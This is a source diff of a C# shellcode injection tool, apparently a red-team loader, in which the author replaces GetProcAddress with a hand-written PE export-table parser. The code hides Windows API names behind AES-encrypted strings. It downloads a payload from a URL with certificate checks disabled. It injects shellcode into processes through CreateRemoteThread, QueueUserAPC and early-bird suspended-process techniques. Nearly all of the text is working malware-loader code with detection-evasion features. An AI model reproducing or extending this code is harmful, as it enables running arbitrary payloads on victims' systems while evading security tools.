@@ -8,20 +8,29 @@ using System.Security.Cryptography;
 using System.Runtime.InteropServices;
 using System.Text;
 
+
 namespace jeringuilla
 {
     class Program
     {
         static readonly IntPtr INVALID_HANDLE_VALUE = new IntPtr(-1);
         // If you change these 2 values you will have to change the AES-encrypted DLL and function names
-        static String password = "ricardojoserf   "; 
-        static String iv = "jeringa jeringa "; 
+        static String password = "ricardojoserf   ";
+        static String iv = "jeringa jeringa ";
         // If you update these 2 values, update it in payloadEncryptor
-        static String payload_aes_password = "ricardojoserf123ricardojoserf123"; 
-        static String payload_aes_iv = "jeringa1jeringa1"; 
+        static String payload_aes_password = "ricardojoserf123ricardojoserf123";
+        static String payload_aes_iv = "jeringa1jeringa1";
 
         [DllImport("kernel32.dll", CharSet = CharSet.Unicode, SetLastError = true)] public static extern IntPtr GetModuleHandle([MarshalAs(UnmanagedType.LPWStr)] string lpModuleName);
-        [DllImport("kernel32.dll")] public static extern IntPtr GetProcAddress(IntPtr hModule, string procedureName);
+        [DllImport("kernel32.dll", SetLastError = true)] static extern bool ReadProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, [Out] byte[] lpBuffer, int dwSize, out IntPtr lpNumberOfBytesRead);
+        // [DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)] static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
+        [StructLayout(LayoutKind.Sequential)] public struct IMAGE_DOS_HEADER { public UInt16 e_magic; public UInt16 e_cblp; public UInt16 e_cp; public UInt16 e_crlc; public UInt16 e_cparhdr; public UInt16 e_minalloc; public UInt16 e_maxalloc; public UInt16 e_ss; public UInt16 e_sp; public UInt16 e_csum; public UInt16 e_ip; public UInt16 e_cs; public UInt16 e_lfarlc; public UInt16 e_ovno; [MarshalAs(UnmanagedType.ByValArray, SizeConst = 4)] public UInt16[] e_res1; public UInt16 e_oemid; public UInt16 e_oeminfo; [MarshalAs(UnmanagedType.ByValArray, SizeConst = 10)] public UInt16[] e_res2; public UInt32 e_lfanew; }
+        [StructLayout(LayoutKind.Sequential)] public struct IMAGE_NT_HEADERS { public UInt32 Signature; public IMAGE_FILE_HEADER FileHeader; public IMAGE_OPTIONAL_HEADER32 OptionalHeader32; public IMAGE_OPTIONAL_HEADER64 OptionalHeader64; }
+        [StructLayout(LayoutKind.Sequential)] public struct IMAGE_FILE_HEADER { public UInt16 Machine; public UInt16 NumberOfSections; public UInt32 TimeDateStamp; public UInt32 PointerToSymbolTable; public UInt32 NumberOfSymbols; public UInt16 SizeOfOptionalHeader; public UInt16 Characteristics; }
+        [StructLayout(LayoutKind.Sequential)] public struct IMAGE_OPTIONAL_HEADER32 { public UInt16 Magic; public Byte MajorLinkerVersion; public Byte MinorLinkerVersion; public UInt32 SizeOfCode; public UInt32 SizeOfInitializedData; public UInt32 SizeOfUninitializedData; public UInt32 AddressOfEntryPoint; public UInt32 BaseOfCode; public UInt32 BaseOfData; public UInt32 ImageBase; public UInt32 SectionAlignment; public UInt32 FileAlignment; public UInt16 MajorOperatingSystemVersion; public UInt16 MinorOperatingSystemVersion; public UInt16 MajorImageVersion; public UInt16 MinorImageVersion; public UInt16 MajorSubsystemVersion; public UInt16 MinorSubsystemVersion; public UInt32 Win32VersionValue; public UInt32 SizeOfImage; public UInt32 SizeOfHeaders; public UInt32 CheckSum; public UInt16 Subsystem; public UInt16 DllCharacteristics; public UInt32 SizeOfStackReserve; public UInt32 SizeOfStackCommit; public UInt32 SizeOfHeapReserve; public UInt32 SizeOfHeapCommit; public UInt32 LoaderFlags; public UInt32 NumberOfRvaAndSizes; [MarshalAs(UnmanagedType.ByValArray, SizeConst = 16)] public IMAGE_DATA_DIRECTORY[] DataDirectory; }
+        [StructLayout(LayoutKind.Sequential)] public struct IMAGE_OPTIONAL_HEADER64 { public UInt16 Magic; public Byte MajorLinkerVersion; public Byte MinorLinkerVersion; public UInt32 SizeOfCode; public UInt32 SizeOfInitializedData; public UInt32 SizeOfUninitializedData; public UInt32 AddressOfEntryPoint; public UInt32 BaseOfCode; public UInt64 ImageBase; public UInt32 SectionAlignment; public UInt32 FileAlignment; public UInt16 MajorOperatingSystemVersion; public UInt16 MinorOperatingSystemVersion; public UInt16 MajorImageVersion; public UInt16 MinorImageVersion; public UInt16 MajorSubsystemVersion; public UInt16 MinorSubsystemVersion; public UInt32 Win32VersionValue; public UInt32 SizeOfImage; public UInt32 SizeOfHeaders; public UInt32 CheckSum; public UInt16 Subsystem; public UInt16 DllCharacteristics; public UInt64 SizeOfStackReserve; public UInt64 SizeOfStackCommit; public UInt64 SizeOfHeapReserve; public UInt64 SizeOfHeapCommit; public UInt32 LoaderFlags; public UInt32 NumberOfRvaAndSizes; [MarshalAs(UnmanagedType.ByValArray, SizeConst = 16)] public IMAGE_DATA_DIRECTORY[] DataDirectory; }
+        [StructLayout(LayoutKind.Sequential)] public struct IMAGE_DATA_DIRECTORY { public UInt32 VirtualAddress; public UInt32 Size; }
+        [StructLayout(LayoutKind.Sequential)] public struct IMAGE_EXPORT_DIRECTORY { public UInt32 Characteristics; public UInt32 TimeDateStamp; public UInt16 MajorVersion; public UInt16 MinorVersion; public UInt32 Name; public UInt32 Base; public UInt32 NumberOfFunctions; public UInt32 NumberOfNames; public UInt32 AddressOfFunctions; public UInt32 AddressOfNames; public UInt32 AddressOfNameOrdinals; }
         [StructLayout(LayoutKind.Sequential)] public struct STARTUPINFO { public int cb; public IntPtr lpReserved; public IntPtr lpDesktop; public IntPtr lpTitle; public int dwX; public int dwY; public int dwXSize; public int dwYSize; public int dwXCountChars; public int dwYCountChars; public int dwFillAttribute; public int dwFlags; public short wShowWindow; public short cbReserved2; public IntPtr lpReserved2; public IntPtr hStdInput; public IntPtr hStdOutput; public IntPtr hStdError; }
         [StructLayout(LayoutKind.Sequential)] public struct PROCESS_INFORMATION { public IntPtr hProcess; public IntPtr hThread; public int dwProcessId; public int dwThreadId; }
 
@@ -37,6 +46,103 @@ namespace jeringuilla
         delegate IntPtr OpenThreadDelegate(uint dwDesiredAccess, bool bInheritHandle, uint dwThreadId);
 
 
+        private static T MarshalBytesTo<T>(byte[] bytes)
+        {
+            GCHandle handle = GCHandle.Alloc(bytes, GCHandleType.Pinned);
+            T theStructure = (T)Marshal.PtrToStructure(handle.AddrOfPinnedObject(), typeof(T));
+            handle.Free();
+            return theStructure;
+        }
+
+
+        static IntPtr auxGetProcAddress(IntPtr pDosHdr, String func_name)
+        {
+            IntPtr hProcess = Process.GetCurrentProcess().Handle;
+            byte[] data = new byte[Marshal.SizeOf(typeof(IMAGE_DOS_HEADER))];
+            ReadProcessMemory(hProcess, pDosHdr, data, data.Length, out _);
+
+            IMAGE_DOS_HEADER _dosHeader = MarshalBytesTo<IMAGE_DOS_HEADER>(data);
+            uint e_lfanew_offset = _dosHeader.e_lfanew;
+            IntPtr nthdr = IntPtr.Add(pDosHdr, Convert.ToInt32(e_lfanew_offset));
+
+            byte[] data2 = new byte[Marshal.SizeOf(typeof(IMAGE_NT_HEADERS))];
+            ReadProcessMemory(hProcess, nthdr, data2, data2.Length, out _);
+            IMAGE_NT_HEADERS _ntHeader = MarshalBytesTo<IMAGE_NT_HEADERS>(data2);
+            IMAGE_FILE_HEADER _fileHeader = _ntHeader.FileHeader;
+
+            IntPtr optionalhdr = IntPtr.Add(nthdr, 24);
+            byte[] data3 = new byte[Marshal.SizeOf(typeof(IMAGE_OPTIONAL_HEADER64))];
+            ReadProcessMemory(hProcess, optionalhdr, data3, data3.Length, out _);
+            IMAGE_OPTIONAL_HEADER64 _optionalHeader = MarshalBytesTo<IMAGE_OPTIONAL_HEADER64>(data3);
+
+            int numberDataDirectory = (_fileHeader.SizeOfOptionalHeader / 16) - 1;
+            IMAGE_DATA_DIRECTORY[] optionalHeaderDataDirectory = _optionalHeader.DataDirectory;
+            uint exportTableRVA = optionalHeaderDataDirectory[0].VirtualAddress;
+
+            if (exportTableRVA != 0)
+            {
+                IntPtr exportTableAddress = IntPtr.Add(pDosHdr, (int)exportTableRVA);
+                byte[] data4 = new byte[Marshal.SizeOf(typeof(IMAGE_EXPORT_DIRECTORY))];
+                ReadProcessMemory(hProcess, exportTableAddress, data4, data4.Length, out _);
+                IMAGE_EXPORT_DIRECTORY exportTable = MarshalBytesTo<IMAGE_EXPORT_DIRECTORY>(data4);
+
+                UInt32 numberOfNames = exportTable.NumberOfNames;
+                UInt32 base_value = exportTable.Base;
+                UInt32 addressOfFunctionsVRA = exportTable.AddressOfFunctions;
+                UInt32 addressOfNamesVRA = exportTable.AddressOfNames;
+                UInt32 addressOfNameOrdinalsVRA = exportTable.AddressOfNameOrdinals;
+                IntPtr addressOfFunctionsRA = IntPtr.Add(pDosHdr, (int)addressOfFunctionsVRA);
+                IntPtr addressOfNamesRA = IntPtr.Add(pDosHdr, (int)addressOfNamesVRA);
+                IntPtr addressOfNameOrdinalsRA = IntPtr.Add(pDosHdr, (int)addressOfNameOrdinalsVRA);
+
+                IntPtr auxaddressOfNamesRA = addressOfNamesRA;
+                IntPtr auxaddressOfNameOrdinalsRA = addressOfNameOrdinalsRA;
+                IntPtr auxaddressOfFunctionsRA = addressOfFunctionsRA;
+
+                for (int i = 0; i < numberOfNames; i++)
+                {
+                    byte[] data5 = new byte[Marshal.SizeOf(typeof(UInt32))];
+                    ReadProcessMemory(hProcess, auxaddressOfNamesRA, data5, data5.Length, out _);
+                    UInt32 functionAddressVRA = MarshalBytesTo<UInt32>(data5);
+                    IntPtr functionAddressRA = IntPtr.Add(pDosHdr, (int)functionAddressVRA);
+                    byte[] data6 = new byte[func_name.Length];
+                    ReadProcessMemory(hProcess, functionAddressRA, data6, data6.Length, out _);
+                    String functionName = Encoding.ASCII.GetString(data6);
+                    if (functionName == func_name)
+                    {
+                        // AdddressofNames --> AddressOfNamesOrdinals
+                        byte[] data7 = new byte[Marshal.SizeOf(typeof(UInt16))];
+                        ReadProcessMemory(hProcess, auxaddressOfNameOrdinalsRA, data7, data7.Length, out _);
+                        UInt16 ordinal = MarshalBytesTo<UInt16>(data7);
+                        // AddressOfNamesOrdinals --> AddressOfFunctions
+                        auxaddressOfFunctionsRA += 4 * ordinal;
+                        byte[] data8 = new byte[Marshal.SizeOf(typeof(UInt32))];
+                        ReadProcessMemory(hProcess, auxaddressOfFunctionsRA, data8, data8.Length, out _);
+                        UInt32 auxaddressOfFunctionsRAVal = MarshalBytesTo<UInt32>(data8);
+                        IntPtr functionAddress = IntPtr.Add(pDosHdr, (int)auxaddressOfFunctionsRAVal);
+                        return functionAddress;
+                    }
+                    auxaddressOfNamesRA += 4;
+                    auxaddressOfNameOrdinalsRA += 2;
+                }
+            }
+
+            return IntPtr.Zero;
+        }
+
+
+        // auxGetProcAddress may fail once if you call it hundreds of times
+        static IntPtr helpGetProcAddress(IntPtr dll_handle, String functioname)
+        {
+            IntPtr functionaddress = IntPtr.Zero;
+            while (functionaddress == IntPtr.Zero)
+            {
+                functionaddress = auxGetProcAddress(dll_handle, functioname);
+            }
+            return functionaddress;
+        }
+
+
         static string DecryptStringFromBytes(String cipherTextEncoded, byte[] Key, byte[] IV)
         {
             byte[] cipherText = Convert.FromBase64String(cipherTextEncoded);
@@ -45,7 +151,7 @@ namespace jeringuilla
             if (Key == null || Key.Length <= 0)
                 throw new ArgumentNullException("Key");
             if (IV == null || IV.Length <= 0)
-                throw new ArgumentNullException("IV"); 
+                throw new ArgumentNullException("IV");
             string plaintext = null;
             using (RijndaelManaged rijAlg = new RijndaelManaged())
             {
@@ -68,16 +174,11 @@ namespace jeringuilla
         }
 
 
-        private static string getProcessOwner(Process process)
+        private static string getProcessOwner(Process process, IntPtr addrOpenProcessToken, IntPtr addrCloseHandle)
         {
             IntPtr processHandle = IntPtr.Zero;
             try
             {
-                String decryptedAdvapi32 = DecryptStringFromBytes("9dOYL40gX4b0hNu/qgaXgA==", Encoding.ASCII.GetBytes(password), Encoding.ASCII.GetBytes(iv));
-                String decryptedOpenProcessToken = DecryptStringFromBytes("sF3ICi5AMd+hES18ADsvonBk3cp8AKV1ZyuKqaotGS8=", Encoding.ASCII.GetBytes(password), Encoding.ASCII.GetBytes(iv));
-
-                IntPtr a32 = GetModuleHandle(decryptedAdvapi32);
-                IntPtr addrOpenProcessToken = GetProcAddress(a32, decryptedOpenProcessToken);
                 OpenProcessTokenDelegate auxOpenProcessToken = (OpenProcessTokenDelegate)Marshal.GetDelegateForFunctionPointer(addrOpenProcessToken, typeof(OpenProcessTokenDelegate));
                 auxOpenProcessToken(process.Handle, 8, out processHandle);
                 WindowsIdentity wi = new WindowsIdentity(processHandle);
@@ -91,12 +192,7 @@ namespace jeringuilla
             finally
             {
                 if (processHandle != IntPtr.Zero)
-                {
-                    String decryptedKernel32 = DecryptStringFromBytes("1GAd1/G7gM4sph/yC0uQLg==", Encoding.ASCII.GetBytes(password), Encoding.ASCII.GetBytes(iv));
-                    String decryptedCloseHandle = DecryptStringFromBytes("raaWfwu7TWCs4mgnq8Pytg==", Encoding.ASCII.GetBytes(password), Encoding.ASCII.GetBytes(iv));
-
-                    IntPtr k32 = GetModuleHandle(decryptedKernel32);
-                    IntPtr addrCloseHandle = GetProcAddress(k32, decryptedCloseHandle);
+                {                    
                     CloseHandleDelegate auxCloseHandle = (CloseHandleDelegate)Marshal.GetDelegateForFunctionPointer(addrCloseHandle, typeof(CloseHandleDelegate));
                     auxCloseHandle(processHandle);
                 }
@@ -107,13 +203,24 @@ namespace jeringuilla
         static Dictionary<string, string> getProcessPids(String process_name)
         {
             Dictionary<string, string> user_pid = new Dictionary<string, string>();
+
+
+            String decryptedKernel32 = DecryptStringFromBytes("1GAd1/G7gM4sph/yC0uQLg==", Encoding.ASCII.GetBytes(password), Encoding.ASCII.GetBytes(iv));
+            String decryptedCloseHandle = DecryptStringFromBytes("raaWfwu7TWCs4mgnq8Pytg==", Encoding.ASCII.GetBytes(password), Encoding.ASCII.GetBytes(iv));
+            IntPtr k32 = GetModuleHandle(decryptedKernel32);
+            IntPtr addrCloseHandle = helpGetProcAddress(k32, decryptedCloseHandle);
+            String decryptedAdvapi32 = DecryptStringFromBytes("9dOYL40gX4b0hNu/qgaXgA==", Encoding.ASCII.GetBytes(password), Encoding.ASCII.GetBytes(iv));
+            String decryptedOpenProcessToken = DecryptStringFromBytes("sF3ICi5AMd+hES18ADsvonBk3cp8AKV1ZyuKqaotGS8=", Encoding.ASCII.GetBytes(password), Encoding.ASCII.GetBytes(iv));
+            IntPtr a32 = GetModuleHandle(decryptedAdvapi32);
+            IntPtr addrOpenProcessToken = helpGetProcAddress(a32, decryptedOpenProcessToken);
+
             Process[] processCollection = { };
             if (process_name == "all")
             {
                 processCollection = Process.GetProcesses();
                 foreach (Process targetProcess in processCollection)
                 {
-                    String processOwner = getProcessOwner(targetProcess);
+                    String processOwner = getProcessOwner(targetProcess, addrOpenProcessToken, addrCloseHandle);
                     String pid = targetProcess.Id.ToString();
                     user_pid.Add(pid, processOwner);
                 }
@@ -123,7 +230,7 @@ namespace jeringuilla
                 processCollection = Process.GetProcesses();
                 foreach (Process targetProcess in processCollection)
                 {
-                    String processOwner = getProcessOwner(targetProcess);
+                    String processOwner = getProcessOwner(targetProcess, addrOpenProcessToken, addrCloseHandle);
                     if ((targetProcess.ProcessName.ToLower() == process_name.ToLower()) || (processOwner.ToLower().Contains(process_name.ToLower())))
                     {
                         String pid = targetProcess.Id.ToString();
@@ -201,8 +308,9 @@ namespace jeringuilla
             }
 
             // Payload from url, http or https
-            else if (payload_str.Substring(0, 4) == "http") {
-                Console.WriteLine("[+] Getting payload from url: "+ payload_str);
+            else if (payload_str.Substring(0, 4) == "http")
+            {
+                Console.WriteLine("[+] Getting payload from url: " + payload_str);
                 System.Net.ServicePointManager.ServerCertificateValidationCallback = delegate { return true; };
                 System.Net.ServicePointManager.SecurityProtocol = System.Net.SecurityProtocolType.Tls12;
                 using (System.Net.WebClient myWebClient = new System.Net.WebClient())
@@ -237,16 +345,18 @@ namespace jeringuilla
 
             String decryptedKernel32 = DecryptStringFromBytes("1GAd1/G7gM4sph/yC0uQLg==", Encoding.ASCII.GetBytes(password), Encoding.ASCII.GetBytes(iv));
             IntPtr k32 = GetModuleHandle(decryptedKernel32);
-           
+
             String decryptedOpenProcess = DecryptStringFromBytes("ZlWSQ5AeZIU0Z/vLWqlQmw==", Encoding.ASCII.GetBytes(password), Encoding.ASCII.GetBytes(iv));
             String decryptedVirtualAllocEx = DecryptStringFromBytes("3VykPNLrF3zOBfq50x+yew==", Encoding.ASCII.GetBytes(password), Encoding.ASCII.GetBytes(iv));
             String decryptedWriteProcessMemory = DecryptStringFromBytes("/nDO1wIStpfXAWtzJEfxi3MplH2K7Wg0M+ZmtjnkI08=", Encoding.ASCII.GetBytes(password), Encoding.ASCII.GetBytes(iv));
             String decryptedCreateRemoteThread = DecryptStringFromBytes("EcLQmi+4wHc4weGwjNgqCQe+1LyC2VMgE3xKs7JyhZY=", Encoding.ASCII.GetBytes(password), Encoding.ASCII.GetBytes(iv));
 
-            IntPtr addrOpenProcess = GetProcAddress(k32, decryptedOpenProcess);
-            IntPtr addrVirtualAllocEx = GetProcAddress(k32, decryptedVirtualAllocEx);
-            IntPtr addrWriteProcessMemory = GetProcAddress(k32, decryptedWriteProcessMemory);
-            IntPtr addrCreateRemoteThread = GetProcAddress(k32, decryptedCreateRemoteThread);
+            
+            IntPtr addrOpenProcess = helpGetProcAddress(k32, decryptedOpenProcess);
+            IntPtr addrVirtualAllocEx = helpGetProcAddress(k32, decryptedVirtualAllocEx);
+            IntPtr addrWriteProcessMemory = helpGetProcAddress(k32, decryptedWriteProcessMemory);
+            IntPtr addrCreateRemoteThread = helpGetProcAddress(k32, decryptedCreateRemoteThread);
+       
             OpenProcessDelegate auxOpenProcess = (OpenProcessDelegate)Marshal.GetDelegateForFunctionPointer(addrOpenProcess, typeof(OpenProcessDelegate));
             VirtualAllocExDelegate auxVirtualAllocEx = (VirtualAllocExDelegate)Marshal.GetDelegateForFunctionPointer(addrVirtualAllocEx, typeof(VirtualAllocExDelegate));
             WriteProcessMemoryDelegate auxWriteProcessMemory = (WriteProcessMemoryDelegate)Marshal.GetDelegateForFunctionPointer(addrWriteProcessMemory, typeof(WriteProcessMemoryDelegate));
@@ -256,20 +366,22 @@ namespace jeringuilla
 
             Process process = Process.GetProcessById(Int32.Parse(processPID));
             String processname = process.ProcessName;
-            String owner = getProcessOwner(process);
+            // String owner = getProcessOwner(process);
             IntPtr hProcess = auxOpenProcess(0x001F0FFF, false, Int32.Parse(processPID));
 
             if (hProcess != INVALID_HANDLE_VALUE)
             {
-                Console.WriteLine("[+] Handle to process {0} (\"{1}\" owned by \"{2}\") created correctly.", processPID, processname, owner);
+                // Console.WriteLine("[+] Handle to process {0} (\"{1}\" owned by \"{2}\") created correctly.", processPID, processname, owner);
+                Console.WriteLine("[+] Handle to process {0} (\"{1}\" created correctly.", processPID, processname);
             }
             else
             {
-                Console.WriteLine("[-] Error: Handle to process {0} (\"{1}\" owned by \"{2}\") is NULL.", processPID, processname, owner);
+                // Console.WriteLine("[-] Error: Handle to process {0} (\"{1}\" owned by \"{2}\") is NULL.", processPID, processname, owner);
+                Console.WriteLine("[-] Error: Handle to process {0} (\"{1}\" is NULL.", processPID, processname);
             }
 
             IntPtr addr = auxVirtualAllocEx(hProcess, IntPtr.Zero, 0x1000, 0x3000, 0x40);
-            
+
             auxWriteProcessMemory(hProcess, addr, buf, buf.Length, out _);
             IntPtr hThread = auxCreateRemoteThread(hProcess, IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
         }
@@ -289,11 +401,11 @@ namespace jeringuilla
             String decryptedQueueUserAPC = DecryptStringFromBytes("cd7xBomTOk7mvZ7UxBJDaQ==", Encoding.ASCII.GetBytes(password), Encoding.ASCII.GetBytes(iv));
             String decryptedOpenThread = DecryptStringFromBytes("ATZJvFQXpEJm5R5ff90mOA==", Encoding.ASCII.GetBytes(password), Encoding.ASCII.GetBytes(iv));
 
-            IntPtr addrOpenProcess = GetProcAddress(k32, decryptedOpenProcess);
-            IntPtr addrVirtualAllocEx = GetProcAddress(k32, decryptedVirtualAllocEx);
-            IntPtr addrWriteProcessMemory = GetProcAddress(k32, decryptedWriteProcessMemory);
-            IntPtr addrQueueUserAPC = GetProcAddress(k32, decryptedQueueUserAPC);
-            IntPtr addrOpenThread = GetProcAddress(k32, decryptedOpenThread);
+            IntPtr addrOpenProcess = helpGetProcAddress(k32, decryptedOpenProcess);
+            IntPtr addrVirtualAllocEx = helpGetProcAddress(k32, decryptedVirtualAllocEx);
+            IntPtr addrWriteProcessMemory = helpGetProcAddress(k32, decryptedWriteProcessMemory);
+            IntPtr addrQueueUserAPC = helpGetProcAddress(k32, decryptedQueueUserAPC);
+            IntPtr addrOpenThread = helpGetProcAddress(k32, decryptedOpenThread);
             OpenProcessDelegate auxOpenProcess = (OpenProcessDelegate)Marshal.GetDelegateForFunctionPointer(addrOpenProcess, typeof(OpenProcessDelegate));
             VirtualAllocExDelegate auxVirtualAllocEx = (VirtualAllocExDelegate)Marshal.GetDelegateForFunctionPointer(addrVirtualAllocEx, typeof(VirtualAllocExDelegate));
             WriteProcessMemoryDelegate auxWriteProcessMemory = (WriteProcessMemoryDelegate)Marshal.GetDelegateForFunctionPointer(addrWriteProcessMemory, typeof(WriteProcessMemoryDelegate));
@@ -304,16 +416,18 @@ namespace jeringuilla
 
             Process process = Process.GetProcessById(Int32.Parse(processPID));
             String processname = process.ProcessName;
-            String owner = getProcessOwner(process);
+            // String owner = getProcessOwner(process);
             IntPtr hProcess = auxOpenProcess(0x001F0FFF, false, Int32.Parse(processPID));
 
             if (hProcess != INVALID_HANDLE_VALUE)
             {
-                Console.WriteLine("[+] Handle to process {0} (\"{1}\" owned by \"{2}\") created correctly.", processPID, processname, owner);
+                // Console.WriteLine("[+] Handle to process {0} (\"{1}\" owned by \"{2}\") created correctly.", processPID, processname, owner);
+                Console.WriteLine("[+] Handle to process {0} (\"{1}\" created correctly.", processPID, processname);
             }
             else
             {
-                Console.WriteLine("[-] Error: Handle to process {0} (\"{1}\" owned by \"{2}\") is NULL.", processPID, processname, owner);
+                // Console.WriteLine("[-] Error: Handle to process {0} (\"{1}\" owned by \"{2}\") is NULL.", processPID, processname, owner);
+                Console.WriteLine("[-] Error: Handle to process {0} (\"{1}\" is NULL.", processPID, processname);
             }
 
             IntPtr addr = auxVirtualAllocEx(hProcess, IntPtr.Zero, (uint)buf.Length, 0x1000, 0x20); // 0x20: PAGE_EXECUTE_READ; 0x1000 = MEM_COMMIT
@@ -337,11 +451,11 @@ namespace jeringuilla
             String decryptedQueueUserAPC = DecryptStringFromBytes("cd7xBomTOk7mvZ7UxBJDaQ==", Encoding.ASCII.GetBytes(password), Encoding.ASCII.GetBytes(iv));
             String decryptedResumeThread = DecryptStringFromBytes("uINo0LSuz3QttywZS2AsBw==", Encoding.ASCII.GetBytes(password), Encoding.ASCII.GetBytes(iv));
 
-            IntPtr addrCreateProcess = GetProcAddress(k32, decryptedCreateProcessA);
-            IntPtr addrVirtualAllocEx = GetProcAddress(k32, decryptedVirtualAllocEx);
-            IntPtr addrWriteProcessMemory = GetProcAddress(k32, decryptedWriteProcessMemory);
-            IntPtr addrQueueUserAPC = GetProcAddress(k32, decryptedQueueUserAPC);
-            IntPtr addrResumeThread = GetProcAddress(k32, decryptedResumeThread);
+            IntPtr addrCreateProcess = helpGetProcAddress(k32, decryptedCreateProcessA);
+            IntPtr addrVirtualAllocEx = helpGetProcAddress(k32, decryptedVirtualAllocEx);
+            IntPtr addrWriteProcessMemory = helpGetProcAddress(k32, decryptedWriteProcessMemory);
+            IntPtr addrQueueUserAPC = helpGetProcAddress(k32, decryptedQueueUserAPC);
+            IntPtr addrResumeThread = helpGetProcAddress(k32, decryptedResumeThread);
             CreateProcessDelegate auxCreateProcess = (CreateProcessDelegate)Marshal.GetDelegateForFunctionPointer(addrCreateProcess, typeof(CreateProcessDelegate));
             VirtualAllocExDelegate auxVirtualAllocEx = (VirtualAllocExDelegate)Marshal.GetDelegateForFunctionPointer(addrVirtualAllocEx, typeof(VirtualAllocExDelegate));
             WriteProcessMemoryDelegate auxWriteProcessMemory = (WriteProcessMemoryDelegate)Marshal.GetDelegateForFunctionPointer(addrWriteProcessMemory, typeof(WriteProcessMemoryDelegate));
@@ -355,12 +469,13 @@ namespace jeringuilla
             si.cb = Marshal.SizeOf(si);
             var pi = new PROCESS_INFORMATION();
             bool success = auxCreateProcess(processname, null, IntPtr.Zero, IntPtr.Zero, false, 0x00000004, IntPtr.Zero, null, ref si, out pi);
-            Console.WriteLine("[+] Trying to spawn a suspended process for "+processname);
+            Console.WriteLine("[+] Trying to spawn a suspended process for " + processname);
             if (success)
             {
                 Console.WriteLine("[+] Process created correctly");
             }
-            else {
+            else
+            {
                 Console.WriteLine("[-] Process failed to create");
                 System.Environment.Exit(0);
             }
@@ -427,16 +542,6 @@ namespace jeringuilla
         }
 
 
-        static bool checkElevated() {
-            if (WindowsIdentity.GetCurrent().Owner.IsWellKnown(WellKnownSidType.BuiltinAdministratorsSid) == false)
-            {
-                Console.WriteLine("[-] Error: Execute with administrative privileges.");
-                return false;
-            }
-            return true;
-        }
-
-
         static void Main(string[] args)
         {
             if (args.Length < 2)
@@ -451,7 +556,7 @@ namespace jeringuilla
             {
                 Dictionary<string, string> processPIDs = getProcessPids(process_str);
                 listInfo(processPIDs);
-                
+
             }
 
             else if (option == "inject-crt")
